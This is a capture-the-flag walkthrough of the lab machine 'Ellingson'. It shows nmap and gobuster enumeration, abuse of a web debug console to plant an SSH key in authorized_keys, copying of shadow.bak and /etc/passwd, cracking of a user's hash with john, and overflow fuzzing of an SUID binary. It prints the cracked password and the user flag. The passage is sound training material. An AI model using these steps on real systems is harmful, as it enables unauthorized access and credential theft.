<center><h1>Ellingson</h1></center>
<br>
<center><h3>Summary</h3></center>

First start with an Nmap scan

```
# Nmap 7.70 scan initiated Sat Jun 15 12:15:32 2019 as: nmap -sV -sC -T4 10.10.10.139
Nmap scan report for 10.10.10.139
Host is up (0.042s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 15 12:15:45 2019 -- 1 IP address (1 host up) scanned in 13.05 seconds
```
Only a couple ports open but I will be looking at port 80 specifically. Navigating to the web page I am greeted with a simple website.

<center><img src="/htb/ellingson/home.png"></center>
<br>
Doing some manual enumeration reveals a post written by <b>The Plague</b> mentioning some of the most common passwords. If you don't recognize this quote it is from the movie <b>hackers</b>

<center><img src="/htb/ellingson/quote.png"></center>
<br>
Next step was to run a <b>gobuster</b>.
```
# gobuster dir -u http://10.10.10.139 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.139
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2019/09/24 16:39:02 Starting gobuster
===============================================================
/index (Status: 200)
/images (Status: 301)
/assets (Status: 301)
```
So there are a few directories but nothing we didn't find with the manual enumeration. Something I did notice is that the <b>/articles</b> directory was not there even though the web page has an <b>/articles</b> directory. This gave me the idea to look closer at that directory to see if I could find anything manually. Turns out that if you enter an article number higher than 3 then it gives you the option to use a python interactive console.

<center><img src="/htb/ellingson/debug.png"></center>
<br>
I can check what user I am by using the <b>getpass</b> module
```
>>> import getpass; getpass.getuser()
'hal'
```
Listing the different users I can see that there are 4 different users
```
>>> import os; os.listdir("/home/")
['margo', 'duke', 'hal', 'theplague']
```
I try to list the contents of the other users home directory but I get a <b>permission denied</b> message. If I list the contents of <b>hal</b> home directory I do see the <b>.ssh</b> folder where I will add my public ssh key so I would be able to SSH into the box. I actually had a problem where I had to delete the old <b>authorized_keys</b> file and create a new one for this to work.
```
>>> import os; os.listdir("/home/hal")
['.profile', '.bashrc', '.ssh', '.gnupg', '.bash_logout', '.viminfo', '.cache']

>>> import os; os.remove("authorized_keys")

>>> f = open("authorized_keys", "x")

>>> file = open('/home/hal/.ssh/authorized_keys', 'a+'); file.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBUPV7FTCebGM8cVPLNAXafVzGxdKWapX8HWSQ6GrzSBCMzB3sFt7yJEeWBGGVOnXM7dz0hpXkyRJ7dU+qhuOApYK2oW8hZmPLHK9+/9+kdFWUQdi/yIMnHuwU/ol2g1k68IrEMv5SgYZayn5+lC6vNng8+Jbs3hAsA0yLcurz86HwJlCOYNJi6cWTaULrTfuwxeWGRIClCUOxct2AJ64jfIAHZJLO0EkRSZZdNxV/dOeQT5WzZYnW9ExEroFpjzyBOkLdTcUNolA2xkTR2tO0YMwJMBGwirbBL4gf0Ibrm4aQ9Cfz0T56zm9YC9eeP82kZS86N6991hbD7LZR7jv4r6SK9hqEYOAhbE5n2ytPAEb6XF7y1ps6PrbwuVaJAustme41oCYafeDjmEjXIO8t6SUIA9HI+WoBp6K4YLI7zKVMWi5Ij705fjHTqEraDw27c3RZhhpJ0Z9zGeMSjG8wD+QvGjIlkMc+5/AAh1KP6EiCoyv5SK0iFjQ2hF7byoM= root@kali"); file.close()
```
Now I am able to SSH in using my public key
```
# ssh -i id_rsa.pub hal@10.10.10.139
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 24 17:31:09 UTC 2019

  System load:  0.08               Processes:            98
  Usage of /:   23.7% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.


Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$
```
As the user <b>hal</b> I start doing some manual enumeration where I eventually come across a <b>shadow.bak</b> that I have read permissions too in the <b>/var/backups</b> directory.
```
hal@ellingson:/var/backups$ ls -la shadow.bak
-rw-r----- 1 root adm 1309 Mar  9  2019 shadow.bak
```
Next step is to copy over the <b>shadow.bak</b> and the <b>passwd</b> file over to my kali box so I can crack the passwords with <b>john</b>. I will use <b>scp</b> for this
```
# scp -i id_rsa.pub hal@10.10.10.139:/var/backups/shadow.bak .
shadow.bak                                                                                 100% 1309    41.6KB/s   00:00    

# scp -i id_rsa.pub hal@10.10.10.139:/etc/passwd .
passwd                                                                                     100% 1757    54.6KB/s   00:00    
```
Now using the <b>unshadow</b> command to put the files into a format <b>john</b> can read.
```
# unshadow passwd shadow.bak > unshadowed.txt
Created directory: /root/.john
```
Now we need to chose a wordlist. Instead of wasting time and using a huge worldist such as <b>rockyou</b>. Earlier we read in the article that the most common passwords are <b>love,sex,secret,and god</b>. Using that information I am going to create my own wordlist.
```
# grep love /usr/share/wordlists/rockyou.txt >> passwords.txt
# grep sex /usr/share/wordlists/rockyou.txt >> passwords.txt
# grep secret /usr/share/wordlists/rockyou.txt >> passwords.txt
# grep god /usr/share/wordlists/rockyou.txt >> passwords.txt
```
Now I can use <b>john</b> in combination with my password list and the <b>unshadowed.txt</b> file. Depending on how fast your computer is. This could take some time but eventually we get a password for the user <b>margo</b>
```
# john --wordlist=passwords.txt unshadowed.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
iamgod$08        (margo)
1g 0:00:12:09 DONE (2019-09-24 18:11) 0.001370g/s 346.1p/s 1374c/s 1374C/s ..god..24.. god143
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We can use the <b>iamgod$08</b> password to SSH in as the user <b>margo</b>
```
# ssh margo@10.10.10.139
margo@10.10.10.139's password:
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Sep 24 18:13:56 UTC 2019

  System load:  0.0                Processes:            103
  Usage of /:   23.8% of 19.56GB   Users logged in:      1
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Mar 10 22:02:27 2019 from 192.168.1.211
margo@ellingson:~$
```
From here we can grab the user flag
```
margo@ellingson:~$ ls
user.txt
margo@ellingson:~$ cat user.txt
d0ff9e3f9da8bb00aaa6c0bb73e45903
```
Now the next step could have been very obvious to you or may have needed some enumeration, depends if you have seen the movie or not. I personally saw the movie therefore I knew to look for a <b>garbage</b> file. I found it using the <b>locate</b> command and I see that the <b>SUID</b> bit is set.
```
margo@ellingson:~$ locate garbage
/usr/bin/garbage

margo@ellingson:~$ ls -la /usr/bin/garbage
-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage

```
Running the program we see it just asks for a password
```
margo@ellingson:~$ /usr/bin/garbage
Enter access password: test

access denied.
```
I end up copying the binary to my kali machine so I can take a closer look at it. I will use <b>scp</b> again to copy it over
```
# scp margo@10.10.10.139:/usr/bin/garbage .
margo@10.10.10.139's password:
garbage                                                                                    100%   18KB 327.4KB/s   00:00    
```
Now I am going to use <b>gdb</b> with the <b>peda</b> extension. Starting <b>gdb</b> I run <b>checksec</b> to see what security precautions are enabled on the binary.
```
# gdb garbage
GNU gdb (Debian 8.3-1) 8.3
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from garbage...
(No debugging symbols found in garbage)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
<b>NX</b> being enabled means that the stack is read only so it's impossible for us to simply just drop in shell code
<b>RELRO</b> is a generic exploit mitigation technique to harden the data sections of an ELF binary or process


Now if we run the program and give it some simple input we get the same output as before.
```
gdb-peda$ r
Starting program: /root/Downloads/Ellingson/garbage
Enter access password: test

access denied.
[Inferior 1 (process 28613) exited with code 0377]
Warning: not running
```
This time lets enter a bunch of A's. If you enter enough A's then you should get a <b>Segmentation fault</b>
```
gdb-peda$ r                                                                                                                  
Starting program: /root/Downloads/Ellingson/garbage                                                                          
Enter access password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                         

access denied.                                                                                                               

Program received signal SIGSEGV, Segmentation fault.                                                                         
[----------------------------------registers-----------------------------------]                                             
RAX: 0x0                                                                                                                     
RBX: 0x0                                                                                                                     
RCX: 0x7ffff7edd504 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)                                               
RDX: 0x7ffff7fb08c0 --> 0x0                                                                                                  
RSI: 0x4055a0 ("access denied.\nssword: ")                                                                                   
RDI: 0x0
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffe128 ('A' <repeats 50 times>)
RIP: 0x401618 (<auth+261>:      ret)
R8 : 0x7ffff7fb5500 (0x00007ffff7fb5500)
R9 : 0x7ffff7faf848 --> 0x7ffff7faf760 --> 0xfbad2a84
R10: 0xfffffffffffff638
R11: 0x246
R12: 0x401170 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe220 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x40160d <auth+250>: call   0x401050 <puts@plt>
0x401612 <auth+255>: mov    eax,0x0
0x401617 <auth+260>: leave  
=> 0x401618 <auth+261>: ret    
0x401619 <main>:     push   rbp
0x40161a <main+1>:   mov    rbp,rsp
0x40161d <main+4>:   sub    rsp,0x10
0x401621 <main+8>:   mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe128 ('A' <repeats 50 times>)
0008| 0x7fffffffe130 ('A' <repeats 42 times>)
0016| 0x7fffffffe138 ('A' <repeats 34 times>)
0024| 0x7fffffffe140 ('A' <repeats 26 times>)
0032| 0x7fffffffe148 ('A' <repeats 18 times>)
0040| 0x7fffffffe150 ("AAAAAAAAAA")
0048| 0x7fffffffe158 --> 0x7fffff004141
0056| 0x7fffffffe160 --> 0x100040000
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()
```
Getting the <b>Segmentation fault</b> tells us the binary is vulnerable to a <b>buffer overflow</b>. Since we can't drop shell code in this will most likely be a <b>return to libc</b> exploit.
